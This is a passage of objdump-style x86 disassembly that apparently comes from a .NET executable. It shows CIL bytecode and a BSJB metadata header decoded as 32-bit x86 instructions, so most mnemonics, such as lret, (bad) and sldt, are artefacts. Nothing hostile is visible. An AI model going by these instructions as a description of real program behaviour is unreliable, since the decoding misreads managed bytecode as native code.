  4052ef:	00 00                	add    %al,(%eax)
  4052f1:	04 12                	add    $0x12,%al
  4052f3:	02 28                	add    (%eax),%ch
  4052f5:	cb                   	lret
  4052f6:	00 00                	add    %al,(%eax)
  4052f8:	0a 7e 1c             	or     0x1c(%esi),%bh
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	04 20                	add    $0x20,%al
  4052ff:	30 75 00             	xor    %dh,0x0(%ebp)
  405302:	00 20                	add    %ah,(%eax)
  405304:	90                   	nop
  405305:	5f                   	pop    %edi
  405306:	01 00                	add    %eax,(%eax)
  405308:	6f                   	outsl  %ds:(%esi),(%dx)
  405309:	39 00                	cmp    %eax,(%eax)
  40530b:	00 0a                	add    %cl,(%edx)
  40530d:	0b 02                	or     (%edx),%eax
  40530f:	28 0b                	sub    %cl,(%ebx)
  405311:	01 00                	add    %eax,(%eax)
  405313:	0a 0d 12 03 07 6c    	or     0x6c070312,%cl
  405319:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40531c:	00 0a                	add    %cl,(%edx)
  40531e:	7d 60                	jge    0x405380
  405320:	00 00                	add    %al,(%eax)
  405322:	04 38                	add    $0x38,%al
  405324:	f3 00 00             	repz add %al,(%eax)
  405327:	00 1b                	add    %bl,(%ebx)
  405329:	8d 27                	lea    (%edi),%esp
  40532b:	00 00                	add    %al,(%eax)
  40532d:	01 13                	add    %edx,(%ebx)
  40532f:	04 16                	add    $0x16,%al
  405331:	13 05 2b 10 11 04    	adc    0x411102b,%eax
  405337:	11 05 28 52 00 00    	adc    %eax,0x5228
  40533d:	06                   	push   %es
  40533e:	a2 11 05 17 58       	mov    %al,0x58170511
  405343:	13 05 11 05 11 04    	adc    0x4110511,%eax
  405349:	8e 69 32             	mov    0x32(%ecx),%gs
  40534c:	e8 11 04 28 0c       	call   0xc685762
  405351:	01 00                	add    %eax,(%eax)
  405353:	0a 6f ca             	or     -0x36(%edi),%ch
  405356:	00 00                	add    %al,(%eax)
  405358:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40535b:	02 28                	add    (%eax),%ch
  40535d:	ef                   	out    %eax,(%dx)
  40535e:	00 00                	add    %al,(%eax)
  405360:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  405366:	0a 7d 5e             	or     0x5e(%ebp),%bh
  405369:	00 00                	add    %al,(%eax)
  40536b:	04 02                	add    $0x2,%al
  40536d:	08 7d 61             	or     %bh,0x61(%ebp)
  405370:	00 00                	add    %al,(%eax)
  405372:	04 02                	add    $0x2,%al
  405374:	7c 5f                	jl     0x4053d5
  405376:	00 00                	add    %al,(%eax)
  405378:	04 12                	add    $0x12,%al
  40537a:	02 02                	add    (%edx),%al
  40537c:	28 11                	sub    %dl,(%ecx)
  40537e:	00 00                	add    %al,(%eax)
  405380:	2b dd                	sub    %ebp,%ebx
  405382:	fb                   	sti
  405383:	00 00                	add    %al,(%eax)
  405385:	00 02                	add    %al,(%edx)
  405387:	7b 61                	jnp    0x4053ea
  405389:	00 00                	add    %al,(%eax)
  40538b:	04 0c                	add    $0xc,%al
  40538d:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  405391:	00 04 fe             	add    %al,(%esi,%edi,8)
  405394:	15 3a 00 00 01       	adc    $0x100003a,%eax
  405399:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
  40539f:	00 00                	add    %al,(%eax)
  4053a1:	04 12                	add    $0x12,%al
  4053a3:	02 28                	add    (%eax),%ch
  4053a5:	cb                   	lret
  4053a6:	00 00                	add    %al,(%eax)
  4053a8:	0a 7e 1c             	or     0x1c(%esi),%bh
  4053ab:	00 00                	add    %al,(%eax)
  4053ad:	04 1f                	add    $0x1f,%al
  4053af:	1e                   	push   %ds
  4053b0:	1f                   	pop    %ds
  4053b1:	46                   	inc    %esi
  4053b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b3:	39 00                	cmp    %eax,(%eax)
  4053b5:	00 0a                	add    %cl,(%edx)
  4053b7:	7e 1e                	jle    0x4053d7
  4053b9:	00 00                	add    %al,(%eax)
  4053bb:	04 6f                	add    $0x6f,%al
  4053bd:	d4 00                	aam    $0x0
  4053bf:	00 0a                	add    %cl,(%edx)
  4053c1:	28 0a                	sub    %cl,(%edx)
  4053c3:	01 00                	add    %eax,(%eax)
  4053c5:	0a 6f ca             	or     -0x36(%edi),%ch
  4053c8:	00 00                	add    %al,(%eax)
  4053ca:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4053cd:	02 28                	add    (%eax),%ch
  4053cf:	ef                   	out    %eax,(%dx)
  4053d0:	00 00                	add    %al,(%eax)
  4053d2:	0a 2d 3f 02 18 25    	or     0x2518023f,%ch
  4053d8:	0a 7d 5e             	or     0x5e(%ebp),%bh
  4053db:	00 00                	add    %al,(%eax)
  4053dd:	04 02                	add    $0x2,%al
  4053df:	08 7d 61             	or     %bh,0x61(%ebp)
  4053e2:	00 00                	add    %al,(%eax)
  4053e4:	04 02                	add    $0x2,%al
  4053e6:	7c 5f                	jl     0x405447
  4053e8:	00 00                	add    %al,(%eax)
  4053ea:	04 12                	add    $0x12,%al
  4053ec:	02 02                	add    (%edx),%al
  4053ee:	28 11                	sub    %dl,(%ecx)
  4053f0:	00 00                	add    %al,(%eax)
  4053f2:	2b dd                	sub    %ebp,%ebx
  4053f4:	89 00                	mov    %eax,(%eax)
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	02 7b 61             	add    0x61(%ebx),%bh
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	04 0c                	add    $0xc,%al
  4053ff:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  405403:	00 04 fe             	add    %al,(%esi,%edi,8)
  405406:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40540b:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
  405411:	00 00                	add    %al,(%eax)
  405413:	04 12                	add    $0x12,%al
  405415:	02 28                	add    (%eax),%ch
  405417:	cb                   	lret
  405418:	00 00                	add    %al,(%eax)
  40541a:	0a 28                	or     (%eax),%ch
  40541c:	0b 01                	or     (%ecx),%eax
  40541e:	00 0a                	add    %cl,(%edx)
  405420:	02 7b 60             	add    0x60(%ebx),%bh
  405423:	00 00                	add    %al,(%eax)
  405425:	04 28                	add    $0x28,%al
  405427:	3e 00 00             	add    %al,%ds:(%eax)
  40542a:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  40542d:	7e 1e                	jle    0x40544d
  40542f:	00 00                	add    %al,(%eax)
  405431:	04 6f                	add    $0x6f,%al
  405433:	0d 01 00 0a 39       	or     $0x390a0001,%eax
  405438:	ec                   	in     (%dx),%al
  405439:	fe                   	(bad)
  40543a:	ff                   	(bad)
  40543b:	ff                   	lcall  (bad)
  40543c:	de 06                	fiadds (%esi)
  40543e:	26 de 12             	ficoms %es:(%edx)
  405441:	26 de 00             	fiadds %es:(%eax)
  405444:	7e 1e                	jle    0x405464
  405446:	00 00                	add    %al,(%eax)
  405448:	04 6f                	add    $0x6f,%al
  40544a:	0d 01 00 0a 39       	or     $0x390a0001,%eax
  40544f:	1b fe                	sbb    %esi,%edi
  405451:	ff                   	(bad)
  405452:	ff                   	lcall  (bad)
  405453:	de 19                	ficomps (%ecx)
  405455:	13 06                	adc    (%esi),%eax
  405457:	02 1f                	add    (%edi),%bl
  405459:	fe                   	(bad)
  40545a:	7d 5e                	jge    0x4054ba
  40545c:	00 00                	add    %al,(%eax)
  40545e:	04 02                	add    $0x2,%al
  405460:	7c 5f                	jl     0x4054c1
  405462:	00 00                	add    %al,(%eax)
  405464:	04 11                	add    $0x11,%al
  405466:	06                   	push   %es
  405467:	28 f8                	sub    %bh,%al
  405469:	00 00                	add    %al,(%eax)
  40546b:	0a de                	or     %dh,%bl
  40546d:	13 02                	adc    (%edx),%eax
  40546f:	1f                   	pop    %ds
  405470:	fe                   	(bad)
  405471:	7d 5e                	jge    0x4054d1
  405473:	00 00                	add    %al,(%eax)
  405475:	04 02                	add    $0x2,%al
  405477:	7c 5f                	jl     0x4054d8
  405479:	00 00                	add    %al,(%eax)
  40547b:	04 28                	add    $0x28,%al
  40547d:	f9                   	stc
  40547e:	00 00                	add    %al,(%eax)
  405480:	0a 2a                	or     (%edx),%ch
  405482:	00 00                	add    %al,(%eax)
  405484:	41                   	inc    %ecx
  405485:	4c                   	dec    %esp
  405486:	00 00                	add    %al,(%eax)
  405488:	00 00                	add    %al,(%eax)
  40548a:	00 00                	add    %al,(%eax)
  40548c:	0f 00 00             	sldt   (%eax)
  40548f:	00 cf                	add    %cl,%bh
  405491:	01 00                	add    %eax,(%eax)
  405493:	00 de                	add    %bl,%dh
  405495:	01 00                	add    %eax,(%eax)
  405497:	00 03                	add    %al,(%ebx)
  405499:	00 00                	add    %al,(%eax)
  40549b:	00 43 00             	add    %al,0x0(%ebx)
  40549e:	00 01                	add    %al,(%ecx)
  4054a0:	00 00                	add    %al,(%eax)
  4054a2:	00 00                	add    %al,(%eax)
  4054a4:	0f 00 00             	sldt   (%eax)
  4054a7:	00 cf                	add    %cl,%bh
  4054a9:	01 00                	add    %eax,(%eax)
  4054ab:	00 e1                	add    %ah,%cl
  4054ad:	01 00                	add    %eax,(%eax)
  4054af:	00 03                	add    %al,(%ebx)
  4054b1:	00 00                	add    %al,(%eax)
  4054b3:	00 1a                	add    %bl,(%edx)
  4054b5:	00 00                	add    %al,(%eax)
  4054b7:	01 00                	add    %eax,(%eax)
  4054b9:	00 00                	add    %al,(%eax)
  4054bb:	00 07                	add    %al,(%edi)
  4054bd:	00 00                	add    %al,(%eax)
  4054bf:	00 ee                	add    %ch,%dh
  4054c1:	01 00                	add    %eax,(%eax)
  4054c3:	00 f5                	add    %dh,%ch
  4054c5:	01 00                	add    %eax,(%eax)
  4054c7:	00 19                	add    %bl,(%ecx)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	00 1a                	add    %bl,(%edx)
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	01 36                	add    %esi,(%esi)
  4054d1:	02 7c 5f 00          	add    0x0(%edi,%ebx,2),%bh
  4054d5:	00 04 03             	add    %al,(%ebx,%eax,1)
  4054d8:	28 fa                	sub    %bh,%dl
  4054da:	00 00                	add    %al,(%eax)
  4054dc:	0a 2a                	or     (%edx),%ch
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	1b 30                	sbb    (%eax),%esi
  4054e2:	03 00                	add    (%eax),%eax
  4054e4:	32 01                	xor    (%ecx),%al
  4054e6:	00 00                	add    %al,(%eax)
  4054e8:	37                   	aaa
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	11 02                	adc    %eax,(%edx)
  4054ed:	7b 62                	jnp    0x405551
  4054ef:	00 00                	add    %al,(%eax)
  4054f1:	04 0a                	add    $0xa,%al
  4054f3:	06                   	push   %es
  4054f4:	2c 0c                	sub    $0xc,%al
  4054f6:	06                   	push   %es
  4054f7:	17                   	pop    %ss
  4054f8:	3b ba 00 00 00 38    	cmp    0x38000000(%edx),%edi
  4054fe:	d8 00                	fadds  (%eax)
  405500:	00 00                	add    %al,(%eax)
  405502:	00 06                	add    %al,(%esi)
  405504:	2c 37                	sub    $0x37,%al
  405506:	28 57 00             	sub    %dl,0x0(%edi)
  405509:	00 06                	add    %al,(%esi)
  40550b:	6f                   	outsl  %ds:(%esi),(%dx)
  40550c:	ca 00 00             	lret   $0x0
  40550f:	0a 0b                	or     (%ebx),%cl
  405511:	12 01                	adc    (%ecx),%al
  405513:	28 ef                	sub    %ch,%bh
  405515:	00 00                	add    %al,(%eax)
  405517:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  40551d:	0a 7d 62             	or     0x62(%ebp),%bh
  405520:	00 00                	add    %al,(%eax)
  405522:	04 02                	add    $0x2,%al
  405524:	07                   	pop    %es
  405525:	7d 64                	jge    0x40558b
  405527:	00 00                	add    %al,(%eax)
  405529:	04 02                	add    $0x2,%al
  40552b:	7c 63                	jl     0x405590
  40552d:	00 00                	add    %al,(%eax)
  40552f:	04 12                	add    $0x12,%al
  405531:	01 02                	add    %eax,(%edx)
  405533:	28 12                	sub    %dl,(%edx)
  405535:	00 00                	add    %al,(%eax)
  405537:	2b dd                	sub    %ebp,%ebx
  405539:	e0 00                	loopne 0x40553b
  40553b:	00 00                	add    %al,(%eax)
  40553d:	02 7b 64             	add    0x64(%ebx),%bh
  405540:	00 00                	add    %al,(%eax)
  405542:	04 0b                	add    $0xb,%al
  405544:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  405548:	00 04 fe             	add    %al,(%esi,%edi,8)
  40554b:	15 3a 00 00 01       	adc    $0x100003a,%eax
  405550:	02 15 25 0a 7d 62    	add    0x627d0a25,%dl
  405556:	00 00                	add    %al,(%eax)
  405558:	04 12                	add    $0x12,%al
  40555a:	01 28                	add    %ebp,(%eax)
  40555c:	cb                   	lret
  40555d:	00 00                	add    %al,(%eax)
  40555f:	0a de                	or     %dh,%bl
  405561:	03 26                	add    (%esi),%esp
  405563:	de 00                	fiadds (%eax)
  405565:	7e 20                	jle    0x405587
  405567:	00 00                	add    %al,(%eax)
  405569:	04 20                	add    $0x20,%al
  40556b:	c0 27 09             	shlb   $0x9,(%edi)
  40556e:	00 20                	add    %ah,(%eax)
  405570:	80 ee 36             	sub    $0x36,%dh
  405573:	00 6f 39             	add    %ch,0x39(%edi)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 7e 22             	or     0x22(%esi),%bh
  40557b:	00 00                	add    %al,(%eax)
  40557d:	04 6f                	add    $0x6f,%al
  40557f:	d4 00                	aam    $0x0
  405581:	00 0a                	add    %cl,(%edx)
  405583:	28 0a                	sub    %cl,(%edx)
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 6f ca             	or     -0x36(%edi),%ch
  40558a:	00 00                	add    %al,(%eax)
  40558c:	0a 0b                	or     (%ebx),%cl
  40558e:	12 01                	adc    (%ecx),%al
  405590:	28 ef                	sub    %ch,%bh
  405592:	00 00                	add    %al,(%eax)
  405594:	0a 2d 3c 02 17 25    	or     0x2517023c,%ch
  40559a:	0a 7d 62             	or     0x62(%ebp),%bh
  40559d:	00 00                	add    %al,(%eax)
  40559f:	04 02                	add    $0x2,%al
  4055a1:	07                   	pop    %es
  4055a2:	7d 64                	jge    0x405608
  4055a4:	00 00                	add    %al,(%eax)
  4055a6:	04 02                	add    $0x2,%al
  4055a8:	7c 63                	jl     0x40560d
  4055aa:	00 00                	add    %al,(%eax)
  4055ac:	04 12                	add    $0x12,%al
  4055ae:	01 02                	add    %eax,(%edx)
  4055b0:	28 12                	sub    %dl,(%edx)
  4055b2:	00 00                	add    %al,(%eax)
  4055b4:	2b de                	sub    %esi,%ebx
  4055b6:	66 02 7b 64          	data16 add 0x64(%ebx),%bh
  4055ba:	00 00                	add    %al,(%eax)
  4055bc:	04 0b                	add    $0xb,%al
  4055be:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  4055c2:	00 04 fe             	add    %al,(%esi,%edi,8)
  4055c5:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4055ca:	02 15 25 0a 7d 62    	add    0x627d0a25,%dl
  4055d0:	00 00                	add    %al,(%eax)
  4055d2:	04 12                	add    $0x12,%al
  4055d4:	01 28                	add    %ebp,(%eax)
  4055d6:	cb                   	lret
  4055d7:	00 00                	add    %al,(%eax)
  4055d9:	0a 7e 22             	or     0x22(%esi),%bh
  4055dc:	00 00                	add    %al,(%eax)
  4055de:	04 6f                	add    $0x6f,%al
  4055e0:	d4 00                	aam    $0x0
  4055e2:	00 0a                	add    %cl,(%edx)
  4055e4:	0c 12                	or     $0x12,%al
  4055e6:	02 28                	add    (%eax),%ch
  4055e8:	aa                   	stos   %al,%es:(%edi)
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	0a 39                	or     (%ecx),%bh
  4055ed:	11 ff                	adc    %edi,%edi
  4055ef:	ff                   	(bad)
  4055f0:	ff                   	lcall  (bad)
  4055f1:	de 17                	ficoms (%edi)
  4055f3:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4055f8:	62 00                	bound  %eax,(%eax)
  4055fa:	00 04 02             	add    %al,(%edx,%eax,1)
  4055fd:	7c 63                	jl     0x405662
  4055ff:	00 00                	add    %al,(%eax)
  405601:	04 09                	add    $0x9,%al
  405603:	28 f8                	sub    %bh,%al
  405605:	00 00                	add    %al,(%eax)
  405607:	0a de                	or     %dh,%bl
  405609:	13 02                	adc    (%edx),%eax
  40560b:	1f                   	pop    %ds
  40560c:	fe                   	(bad)
  40560d:	7d 62                	jge    0x405671
  40560f:	00 00                	add    %al,(%eax)
  405611:	04 02                	add    $0x2,%al
  405613:	7c 63                	jl     0x405678
  405615:	00 00                	add    %al,(%eax)
  405617:	04 28                	add    $0x28,%al
  405619:	f9                   	stc
  40561a:	00 00                	add    %al,(%eax)
  40561c:	0a 2a                	or     (%edx),%ch
  40561e:	00 00                	add    %al,(%eax)
  405620:	41                   	inc    %ecx
  405621:	34 00                	xor    $0x0,%al
  405623:	00 00                	add    %al,(%eax)
  405625:	00 00                	add    %al,(%eax)
  405627:	00 17                	add    %dl,(%edi)
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 5f 00             	add    %bl,0x0(%edi)
  40562e:	00 00                	add    %al,(%eax)
  405630:	76 00                	jbe    0x405632
  405632:	00 00                	add    %al,(%eax)
  405634:	03 00                	add    (%eax),%eax
  405636:	00 00                	add    %al,(%eax)
  405638:	1a 00                	sbb    (%eax),%al
  40563a:	00 01                	add    %al,(%ecx)
  40563c:	00 00                	add    %al,(%eax)
  40563e:	00 00                	add    %al,(%eax)
  405640:	07                   	pop    %es
  405641:	00 00                	add    %al,(%eax)
  405643:	00 00                	add    %al,(%eax)
  405645:	01 00                	add    %eax,(%eax)
  405647:	00 07                	add    %al,(%edi)
  405649:	01 00                	add    %eax,(%eax)
  40564b:	00 17                	add    %dl,(%edi)
  40564d:	00 00                	add    %al,(%eax)
  40564f:	00 1a                	add    %bl,(%edx)
  405651:	00 00                	add    %al,(%eax)
  405653:	01 36                	add    %esi,(%esi)
  405655:	02 7c 63 00          	add    0x0(%ebx,%eiz,2),%bh
  405659:	00 04 03             	add    %al,(%ebx,%eax,1)
  40565c:	28 fa                	sub    %bh,%dl
  40565e:	00 00                	add    %al,(%eax)
  405660:	0a 2a                	or     (%edx),%ch
  405662:	00 00                	add    %al,(%eax)
  405664:	42                   	inc    %edx
  405665:	53                   	push   %ebx
  405666:	4a                   	dec    %edx
  405667:	42                   	inc    %edx
  405668:	01 00                	add    %eax,(%eax)
  40566a:	01 00                	add    %eax,(%eax)
  40566c:	00 00                	add    %al,(%eax)
  40566e:	00 00                	add    %al,(%eax)
  405670:	0c 00                	or     $0x0,%al
  405672:	00 00                	add    %al,(%eax)
  405674:	76 34                	jbe    0x4056aa
  405676:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405679:	33 30                	xor    (%eax),%esi
  40567b:	33 31                	xor    (%ecx),%esi
  40567d:	39 00                	cmp    %eax,(%eax)
  40567f:	00 00                	add    %al,(%eax)
  405681:	00 05 00 6c 00 00    	add    %al,0x6c00
  405687:	00 94 1c 00 00 23 7e 	add    %dl,0x7e230000(%esp,%ebx,1)
  40568e:	00 00                	add    %al,(%eax)
  405690:	00 1d 00 00 f4 1e    	add    %bl,0x1ef40000
  405696:	00 00                	add    %al,(%eax)
  405698:	23 53 74             	and    0x74(%ebx),%edx
  40569b:	72 69                	jb     0x405706
  40569d:	6e                   	outsb  %ds:(%esi),(%dx)
  40569e:	67 73 00             	addr16 jae 0x4056a1
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 f4                	add    %dh,%ah
  4056a5:	3b 00                	cmp    (%eax),%eax
  4056a7:	00 38                	add    %bh,(%eax)
  4056a9:	17                   	pop    %ss
  4056aa:	00 00                	add    %al,(%eax)
  4056ac:	23 55 53             	and    0x53(%ebp),%edx
  4056af:	00 2c 53             	add    %ch,(%ebx,%edx,2)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	10 00                	adc    %al,(%eax)
  4056b6:	00 00                	add    %al,(%eax)
  4056b8:	23 47 55             	and    0x55(%edi),%eax
  4056bb:	49                   	dec    %ecx
  4056bc:	44                   	inc    %esp
  4056bd:	00 00                	add    %al,(%eax)
  4056bf:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	60                   	pusha
  4056c5:	0b 00                	or     (%eax),%eax
  4056c7:	00 23                	add    %ah,(%ebx)
  4056c9:	42                   	inc    %edx
  4056ca:	6c                   	insb   (%dx),%es:(%edi)
  4056cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4056cc:	62 00                	bound  %eax,(%eax)
  4056ce:	00 00                	add    %al,(%eax)
  4056d0:	00 00                	add    %al,(%eax)
  4056d2:	00 00                	add    %al,(%eax)
  4056d4:	02 00                	add    (%eax),%al
  4056d6:	00 01                	add    %al,(%ecx)
  4056d8:	57                   	push   %edi
  4056d9:	df 02                	filds  (%edx)
  4056db:	3e 09 0a             	or     %ecx,%ds:(%edx)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	00 fa                	add    %bh,%dl
  4056e2:	01 33                	add    %esi,(%ebx)
  4056e4:	00 16                	add    %dl,(%esi)
  4056e6:	00 00                	add    %al,(%eax)
  4056e8:	01 00                	add    %eax,(%eax)
  4056ea:	00 00                	add    %al,(%eax)
  4056ec:	86 00                	xchg   %al,(%eax)
  4056ee:	00 00                	add    %al,(%eax)
  4056f0:	2f                   	das
  4056f1:	00 00                	add    %al,(%eax)
  4056f3:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4056f7:	00 8b 00 00 00 59    	add    %cl,0x59000000(%ebx)
  4056fd:	00 00                	add    %al,(%eax)
  4056ff:	00 08                	add    %cl,(%eax)
  405701:	00 00                	add    %al,(%eax)
  405703:	00 0d 01 00 00 07    	add    %cl,0x7000001
  405709:	00 00                	add    %al,(%eax)
  40570b:	00 33                	add    %dh,(%ebx)
  40570d:	00 00                	add    %al,(%eax)
  40570f:	00 01                	add    %al,(%ecx)
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 00                	add    %al,(%eax)
  405717:	00 37                	add    %dh,(%edi)
  405719:	00 00                	add    %al,(%eax)
  40571b:	00 10                	add    %dl,(%eax)
  40571d:	00 00                	add    %al,(%eax)
  40571f:	00 04 00             	add    %al,(%eax,%eax,1)
  405722:	00 00                	add    %al,(%eax)
  405724:	06                   	push   %es
  405725:	00 00                	add    %al,(%eax)
  405727:	00 10                	add    %dl,(%eax)
  405729:	00 00                	add    %al,(%eax)
  40572b:	00 02                	add    %al,(%edx)
  40572d:	00 00                	add    %al,(%eax)
  40572f:	00 01                	add    %al,(%ecx)
  405731:	00 00                	add    %al,(%eax)
  405733:	00 04 00             	add    %al,(%eax,%eax,1)
  405736:	00 00                	add    %al,(%eax)
  405738:	17                   	pop    %ss
  405739:	00 00                	add    %al,(%eax)
  40573b:	00 12                	add    %dl,(%edx)
  40573d:	00 00                	add    %al,(%eax)
  40573f:	00 00                	add    %al,(%eax)
  405741:	00 10                	add    %dl,(%eax)
  405743:	0e                   	push   %cs
  405744:	01 00                	add    %eax,(%eax)
  405746:	00 00                	add    %al,(%eax)
  405748:	00 00                	add    %al,(%eax)
  40574a:	06                   	push   %es
  40574b:	00 1e                	add    %bl,(%esi)
  40574d:	0d 9b 16 06 00       	or     $0x6169b,%eax
  405752:	8b 0d 9b 16 06 00    	mov    0x6169b,%ecx
  405758:	03 0c e3             	add    (%ebx,%eiz,8),%ecx
  40575b:	15 0f 00 d3 16       	adc    $0x16d3000f,%eax
  405760:	00 00                	add    %al,(%eax)
  405762:	06                   	push   %es
  405763:	00 2b                	add    %ch,(%ebx)
  405765:	0c 62                	or     $0x62,%al
  405767:	12 06                	adc    (%esi),%al
  405769:	00 01                	add    %al,(%ecx)
  40576b:	0d 62 12 06 00       	or     $0x61262,%eax
  405770:	e2 0c                	loop   0x40577e
  405772:	62 12                	bound  %edx,(%edx)
  405774:	06                   	push   %es
  405775:	00 72 0d             	add    %dh,0xd(%edx)
  405778:	62 12                	bound  %edx,(%edx)
  40577a:	06                   	push   %es
  40577b:	00 3e                	add    %bh,(%esi)
  40577d:	0d 62 12 06 00       	or     $0x61262,%eax
  405782:	57                   	push   %edi
  405783:	0d 62 12 06 00       	or     $0x61262,%eax
  405788:	5d                   	pop    %ebp
  405789:	0c 62                	or     $0x62,%al
  40578b:	12 06                	adc    (%esi),%al
  40578d:	00 17                	add    %dl,(%edi)
  40578f:	0c 7c                	or     $0x7c,%al
  405791:	16                   	push   %ss
  405792:	06                   	push   %es
  405793:	00 db                	add    %bl,%bl
  405795:	0b 7c 16 06          	or     0x6(%esi,%edx,1),%edi
  405799:	00 a9 0c 62 12 06    	add    %ch,0x612620c(%ecx)
  40579f:	00 78 0c             	add    %bh,0xc(%eax)
  4057a2:	c8 0e 06 00          	enter  $0x60e,$0x0
  4057a6:	44                   	inc    %esp
  4057a7:	12 6f 18             	adc    0x18(%edi),%ch
  4057aa:	06                   	push   %es
  4057ab:	00 c6                	add    %al,%dh
  4057ad:	0c 6f                	or     $0x6f,%al
  4057af:	18 06                	sbb    %al,(%esi)
  4057b1:	00 e9                	add    %ch,%cl
  4057b3:	0b c3                	or     %ebx,%eax
  4057b5:	1e                   	push   %ds
  4057b6:	06                   	push   %es
  4057b7:	00 e3                	add    %ah,%bl
  4057b9:	1a 63 11             	sbb    0x11(%ebx),%ah
  4057bc:	06                   	push   %es
  4057bd:	00 02                	add    %al,(%edx)
  4057bf:	1e                   	push   %ds
  4057c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4057c1:	02 06                	add    (%esi),%al
  4057c3:	00 78 11             	add    %bh,0x11(%eax)
  4057c6:	63 11                	arpl   %edx,(%ecx)
  4057c8:	06                   	push   %es
  4057c9:	00 f7                	add    %dh,%bh
  4057cb:	09 63 11             	or     %esp,0x11(%ebx)
  4057ce:	06                   	push   %es
  4057cf:	00 22                	add    %ah,(%edx)
  4057d1:	1c 3c                	sbb    $0x3c,%al
  4057d3:	0e                   	push   %cs
  4057d4:	06                   	push   %es
  4057d5:	00 c0                	add    %al,%al
  4057d7:	0b 9b 16 0a 00 fb    	or     -0x4fff5ea(%ebx),%ebx
  4057dd:	19 e3                	sbb    %esp,%ebx
  4057df:	15 06 00 0e 13       	adc    $0x130e0006,%eax
  4057e4:	63 11                	arpl   %edx,(%ecx)
  4057e6:	0e                   	push   %cs
  4057e7:	00 d9                	add    %bl,%cl
  4057e9:	1a da                	sbb    %dl,%bl
  4057eb:	1b 0a                	sbb    (%edx),%ecx
  4057ed:	00 99 14 39 1b 0a    	add    %bl,0xa1b3914(%ecx)
  4057f3:	00 56 1c             	add    %dl,0x1c(%esi)
  4057f6:	39 1b                	cmp    %ebx,(%ebx)
  4057f8:	0e                   	push   %cs
  4057f9:	00 40 14             	add    %al,0x14(%eax)
  4057fc:	da 1b                	ficompl (%ebx)
  4057fe:	0e                   	push   %cs
  4057ff:	00 88 12 da 1b 7f    	add    %cl,0x7f1bda12(%eax)
  405805:	00 8d 15 00 00 0e    	add    %cl,0xe000015(%ebp)
  40580b:	00 bc 1a da 1b 0a 00 	add    %bh,0xa1bda(%edx,%ebx,1)
  405812:	8e 07                	mov    (%edi),%es
  405814:	14 12                	adc    $0x12,%al
  405816:	06                   	push   %es
  405817:	00 12                	add    %dl,(%edx)
  405819:	07                   	pop    %es
  40581a:	63 11                	arpl   %edx,(%ecx)
  40581c:	06                   	push   %es
  40581d:	00 d8                	add    %bl,%al
  40581f:	07                   	pop    %es
  405820:	3c 0e                	cmp    $0xe,%al
  405822:	06                   	push   %es
  405823:	00 1f                	add    %bl,(%edi)
  405825:	0b 63 11             	or     0x11(%ebx),%esp
  405828:	06                   	push   %es
  405829:	00 42 0c             	add    %al,0xc(%edx)
  40582c:	9b                   	fwait
  40582d:	16                   	push   %ss
  40582e:	06                   	push   %es
  40582f:	00 2d 10 fc 17 0a    	add    %ch,0xa17fc10
  405835:	00 69 1b             	add    %ch,0x1b(%ecx)
  405838:	72 1a                	jb     0x405854
  40583a:	06                   	push   %es
  40583b:	00 ac 11 3c 0e 0a 00 	add    %ch,0xa0e3c(%ecx,%edx,1)
  405842:	80 14 72 1a          	adcb   $0x1a,(%edx,%esi,2)
  405846:	0a 00                	or     (%eax),%al
  405848:	d0 1b                	rcrb   $1,(%ebx)
  40584a:	72 1a                	jb     0x405866
  40584c:	0a 00                	or     (%eax),%al
  40584e:	20 11                	and    %dl,(%ecx)
  405850:	72 1a                	jb     0x40586c
  405852:	06                   	push   %es
  405853:	00 e6                	add    %ah,%dh
  405855:	13 db                	adc    %ebx,%ebx
  405857:	04 06                	add    $0x6,%al
  405859:	00 f5                	add    %dh,%ch
  40585b:	14 db                	adc    $0xdb,%al
  40585d:	04 0a                	add    $0xa,%al
  40585f:	00 03                	add    %al,(%ebx)
  405861:	1a 39                	sbb    (%ecx),%bh
  405863:	1b 0a                	sbb    (%edx),%ecx
  405865:	00 37                	add    %dh,(%edi)
  405867:	0e                   	push   %cs
  405868:	14 12                	adc    $0x12,%al
  40586a:	0a 00                	or     (%eax),%al
  40586c:	20 1e                	and    %bl,(%esi)
  40586e:	14 12                	adc    $0x12,%al
  405870:	06                   	push   %es
  405871:	00 99 11 63 11 06    	add    %bl,0x6116311(%ecx)
  405877:	00 4c 12 63          	add    %cl,0x63(%edx,%edx,1)
  40587b:	11 0e                	adc    %ecx,(%esi)
  40587d:	00 9f 18 da 1b 0e    	add    %bl,0xe1bda18(%edi)
  405883:	00 c3                	add    %al,%bl
